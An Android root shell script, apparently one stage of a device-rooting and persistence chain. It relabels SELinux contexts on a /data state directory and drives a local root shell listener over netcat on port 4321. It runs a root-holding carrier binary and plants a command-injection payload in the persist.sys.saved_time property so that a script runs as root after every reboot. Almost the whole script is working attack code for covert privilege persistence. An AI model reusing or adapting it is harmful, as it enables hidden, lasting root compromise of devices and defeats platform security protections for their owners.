#!/system/bin/sh
# stage4 measurement: run ONCE as root, gathers every unknown about the persistence
# install so the next trial is high-confidence instead of a guess.
#
# Writes its findings to stdout, which the host captures. Nothing is changed except
# labels/modes on the persistence tree, all under /data.
#
# Questions answered:
#   A. which SELinux label lets the uid-1000 (system_app) channel create AND read a
#      file in the state dir?   <- the app must create native_result and read it back
#   B. does the app's exact native command return __SNU_NATIVE_0__?
#   C. can the worker re-arm the trigger?
#   D. does the trigger actually fire after a reboot (does time_update read our file)?

SNS=/data/securedStorageLocation/snusnu
STATE=$SNS/state
W=/data/securedStorageLocation/w
CARRIER=/data/snusnu_hwbinder_root
TRIGGER='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
CH=4321
say() { echo "$*"; }

say "===== A. state-dir label sweep (channel must create AND read) ====="
say "state dir before: $(ls -ldZ $STATE 2>/dev/null)"
for lab in assetstorage_data_file system_data_file app_data_file shell_data_file system_app_data_file system_server_data_file; do
    chcon u:object_r:${lab}:s0 "$STATE" 2>/dev/null
    # Probe from the channel, exactly as the app would.
    out=$(printf 'P=%s/probe_%s; rm -f "$P" 2>/dev/null; echo hi > "$P" 2>&1 && cat "$P" 2>&1 && echo PROBE_OK\nexit\n' "$STATE" "$lab" \
          | toybox nc -w 12 127.0.0.1 $CH 2>/dev/null)
    case "$out" in
        *PROBE_OK*) say "  $lab : CREATE+READ OK" ;;
        *)          say "  $lab : denied  [$(echo "$out" | tr -d '\n' | cut -c1-90)]" ;;
    esac
done

say ""
say "===== B. the app's exact native command, run from the channel ====="
say "carrier: $(ls -lZ $CARRIER 2>/dev/null)"
out=$(printf 'for i in $(seq 1 60); do [ "$(getprop sys.boot_completed)" = 1 ] && break; sleep 1; done; sleep 2; out=%s/native_result; pidfile=%s/carrier_pid; rm -f "$out"; %s stateful-root-hold </dev/null >"$out" 2>&1 & keeper=$!; printf "%%s\\n" "$keeper" >"$pidfile"; for i in $(seq 1 120); do if grep -q __SNU_NATIVE_0__ "$out" 2>/dev/null; then cat "$out"; exit; fi; if ! kill -0 "$keeper" 2>/dev/null; then cat "$out"; exit; fi; sleep 1; done; cat "$out"; exit\nexit\n' \
      "$STATE" "$STATE" "$CARRIER" | toybox nc -w 190 127.0.0.1 $CH 2>/dev/null)
say "  native output: [$out]"
case "$out" in
    *__SNU_NATIVE_0__*) say "  -> the app's native step would SUCCEED" ;;
    *)                  say "  -> the app's native step would report system_native_failed" ;;
esac
say "  enforce after: $(getenforce 2>/dev/null)"
say "  carrier procs: $(ps -A 2>/dev/null | grep -c codex)"

say ""
say "===== C. can the worker re-arm the trigger? ====="
out=$(printf 'echo before=$(getprop persist.sys.saved_time); setprop persist.sys.saved_time "%s"; echo rc=$?; echo after=$(getprop persist.sys.saved_time)\nexit\n' "$TRIGGER" \
      | toybox nc -w 12 127.0.0.1 $CH 2>/dev/null)
say "$out"

say ""
say "===== D. current persistence state ====="
say "  trigger    : $(getprop persist.sys.saved_time)"
say "  w/b        : $(ls -lZ $W/b 2>/dev/null)"
say "  state dir  : $(ls -ldZ $STATE 2>/dev/null)"
say "  state files: $(ls -l $STATE 2>/dev/null | tr '\n' ' ')"
say "  enabled    : $(settings get global snusnu_persist_enabled)"
say "  persist    : $(settings get global snusnu_persist_status)"
say "  rearm      : $(settings get global snusnu_rearm_status)"
say "  enforce    : $(getenforce 2>/dev/null)"
say "MEASURE_DONE"
